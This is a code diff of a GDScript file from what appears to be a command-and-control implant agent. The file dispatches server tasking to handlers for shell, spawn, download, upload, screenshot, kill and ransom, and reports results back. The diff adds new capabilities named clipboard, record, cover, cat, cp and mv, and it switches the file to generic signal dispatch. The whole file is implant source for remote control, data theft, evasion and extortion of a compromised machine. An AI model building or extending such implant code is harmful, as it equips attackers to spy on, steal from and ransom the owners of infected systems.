@@ -6,7 +6,14 @@ var task_id_to_last_action
 
 signal whoami
 signal exit
+signal clipboard
 signal ransom
+signal cat
+signal record
+signal cp
+signal mv
+signal cwd
+signal cover
 signal post_response
 signal ls
 signal kill
@@ -22,8 +29,6 @@ signal download
 signal download_start
 signal download_chunk
 signal screenshot
-signal screenshot_start
-signal screenshot_chunk
 
 func _ready():
 	parent = $".".get_parent()
@@ -31,17 +36,6 @@ func _ready():
 	api = parent.get_node("api")
 	task_id_to_last_action = {}
 
-func _on_CallbackTimer_timeout():
-	print("_on_CallbackTimer_timeout, adding tasking request to outbound queue")
-	# TODO: if not api.checkin_done and we've had X timeout/callbacks - kill agent?
-	var cbt = parent.get_node("CallbackTimer")
-	
-	# TODO: implement command 'sleep' - hook here
-	cbt.wait_time = parent.get_node("config").get_callback_wait_time()
-	cbt.do_callback = true
-
-	if api.checkin_done:
-		api.send_agent_response(api.get_tasking_payload())
 
 func _on_Agent_tasking(data):
 
@@ -51,41 +45,21 @@ func _on_Agent_tasking(data):
 
 		for task in data.get("payload").get("tasks"):
 			print("task: ", task)
+			var command = task.get("command")
 
-			match task.get("command"):
+			match command:
 				"screenshot":
-					task_id_to_last_action[task.get("id")] = "screenshot"
-					emit_signal("screenshot", task)
+					task_id_to_last_action[task.get("id")] = command
 				"download":
-					task_id_to_last_action[task.get("id")] = "download"
-					emit_signal("download", task)
+					task_id_to_last_action[task.get("id")] = command
 				"upload":
-					task_id_to_last_action[task.get("id")] = "upload"
-					emit_signal("upload", task)
-				"shell":
-					emit_signal("shell", task)
-				"spawn":
-					emit_signal("spawn", task)
-				"gdscript":
-					emit_signal("gdscript", task)
-				"kill":
-					emit_signal("kill", task)
-				"sleep":
-					emit_signal("sleep", task)
-				"ls":
-					emit_signal("ls", task)
-				"rm":
-					emit_signal("rm", task)
-				"whoami":
-					emit_signal("whoami", task)
-				"exit":
-					emit_signal("exit", task)
-				"ransom":
-					emit_signal("ransom", task)
-				"post_response":
-					emit_signal("post_response", task)
+					task_id_to_last_action[task.get("id")] = command
 				_:
 					print("unknown task... ", task)
+
+			if has_signal(command):
+				emit_signal(command, task)
+
 
 func _on_Agent_post_response(data):
 	print("_on_Agent_post_response: ", data)
@@ -121,22 +95,9 @@ func _on_Agent_post_response(data):
 					task_id_to_last_action[task_id ] = "download_chunk"
 				"screenshot":
 					if response.has("file_id"):
-						emit_signal("screenshot_start", response)
+						emit_signal("download_start", response)
 						task_id_to_last_action[task_id ] = "download_chunk"
 					else:
 						print("Bad screenshot response: ", response)
-				"screenshot_chunk":
-					emit_signal("screenshot_chunk", response)
-					task_id_to_last_action[task_id ] = "screenshot_chunk"
-				_:
-					print("unknown last action: ", task_id_to_last_action.get(task_id))
 		else:
 			print("failed response: ", response)
-
-	#{"action": "post_response", "responses": [{
-	#        "status": "success",
-	#        "file_id": "UUID Here"
-	#        "task_id": "task uuid here"
-	#    }
-	#]}
-	
